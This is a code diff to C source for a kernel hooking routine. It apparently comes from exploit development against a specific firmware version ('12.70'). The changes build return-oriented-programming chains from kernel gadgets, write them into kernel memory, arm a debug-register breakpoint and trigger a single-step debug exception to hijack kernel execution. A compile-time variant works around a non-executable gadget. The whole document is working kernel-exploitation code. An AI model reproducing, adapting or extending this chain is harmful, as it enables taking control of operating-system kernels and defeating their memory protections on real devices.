@@ -305,8 +305,11 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   uint8_t bigbuf[0x600];
   uint64_t scratch, arm_chain, disp_chain, big;
   uint64_t frame_base, rflags_slot, iret_tramp;
-  size_t iret_tramp_off, save_len, handler_len, restore_off, off;
+  size_t iret_tramp_off, handler_len, off;
+#ifndef AP_DIAG_PRESTAGE_1270
+  size_t save_len, restore_off;
   uint64_t slot_rdi, slot_rsi, slot_rdx;
+#endif
   uint64_t db_gate, ist, lo, hi;
 
   if (!kh || kh->installed)
@@ -362,14 +365,18 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
     img[i] = 0;
 
   {
+#ifndef AP_DIAG_PRESTAGE_1270
     uint64_t ctx_struct = scratch + KH_OFF_RESUME;
+#endif
     uint64_t cont_chain = scratch + KH_OFF_CHAIN_CONT;
 
     off = KH_OFF_CHAIN_ARM;
     off = putq(img, off, kgadget(KERNEL_GADGET_POP_RAX));
     off = putq(img, off, kh->hook_kaddr);
+#ifndef AP_DIAG_PRESTAGE_1270
     off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
     off = putq(img, off, ctx_struct);
+#endif
     off = putq(img, off, kgadget(KERNEL_GADGET_DBREG_RESUME));
     if (off > KH_OFF_CHAIN_CONT)
       return -5;
@@ -380,11 +387,19 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
     putq(img, KH_OFF_RESUME + KH_RC_DR7, KH_DR7_BP0_EXEC);
 
     off = KH_OFF_CHAIN_CONT;
+#ifdef AP_DIAG_PRESTAGE_1270
+    off = putq(img, off, kgadget(KERNEL_GADGET_POP_RCX));
+    off = putq(img, off, ist);
+    off = putq(img, off, kgadget(KERNEL_GADGET_POP_R8));
+    off = putq(img, off, disp_chain);
+    off = putq(img, off, kgadget(KERNEL_GADGET_STORE_RCX_R8));
+#else
     off = putq(img, off, kgadget(KERNEL_GADGET_POP_RDI));
     off = putq(img, off, ist - 8);
     off = putq(img, off, kgadget(KERNEL_GADGET_POP_RCX));
     off = putq(img, off, disp_chain);
     off = putq(img, off, kgadget(KERNEL_GADGET_STORE_RDI8_RCX));
+#endif
     off = putq(img, off, kgadget(KERNEL_GADGET_IRETQ));
 
     kh->arm_rip_slot = scratch + off;
@@ -409,14 +424,23 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   for (size_t i = 0; i < sizeof bigbuf; i++)
     bigbuf[i] = 0;
 
+#ifndef AP_DIAG_PRESTAGE_1270
   save_len    = 0x58;
+#endif
   handler_len = (handler && handler->len) ? handler->len : 0;
+#ifdef AP_DIAG_PRESTAGE_1270
+  if (handler_len)
+    return -19;
+#endif
+#ifndef AP_DIAG_PRESTAGE_1270
   restore_off = save_len + handler_len;
   slot_rdi = big + restore_off + 0x08;
   slot_rsi = big + restore_off + 0x18;
   slot_rdx = big + restore_off + 0x28;
+#endif
 
   off = 0;
+#ifndef AP_DIAG_PRESTAGE_1270
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_MOV_RAX_RSI));   // rax = rsi
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
   off = putq(bigbuf, off, slot_rsi);
@@ -428,7 +452,6 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
   off = putq(bigbuf, off, slot_rdi);
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));    // [slot_rdi] = rdi
-
   if (handler_len) {
     for (size_t i = 0; i < handler_len; i++)
       bigbuf[off + i] = handler->buf[i];
@@ -441,6 +464,7 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   off = putq(bigbuf, off, 0);
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RDX));
   off = putq(bigbuf, off, 0);
+#endif
 
   off = emit_resume_tail(kh, bigbuf, off, frame_base, rflags_slot, iret_tramp);
   if (off > sizeof bigbuf)
@@ -496,12 +520,25 @@ int kh_trigger(khook_t *kh)
       kwrite_q(kh, kh->arm_rsp_slot, resume_rsp) != 0)
     return -2;
 
+#ifdef AP_DIAG_PRESTAGE_1270
+  // The diagnostic arm chain starts at DBREG_RESUME. Supply its context in
+  // RDI before single stepping so it never executes the 12.70 NX POP_RDI.
+  uint64_t ctx_struct = kh->scratch_base + KH_OFF_RESUME;
+  __asm__ volatile(
+      "mov %[ctx], %%rdi    \n\t"
+      "pushfq             \n\t"
+      "orq $0x100, (%%rsp)\n\t"
+      "popfq              \n\t"
+      "nop                \n\t"
+      : : [ctx] "r"(ctx_struct) : "rdi", "memory", "cc");
+#else
   __asm__ volatile(
       "pushfq             \n\t"
       "orq $0x100, (%%rsp)\n\t"   // set TF
       "popfq              \n\t"
       "nop                \n\t"   // single-step #DB
       ::: "memory", "cc");
+#endif
 resumed:
   return 0;
 }
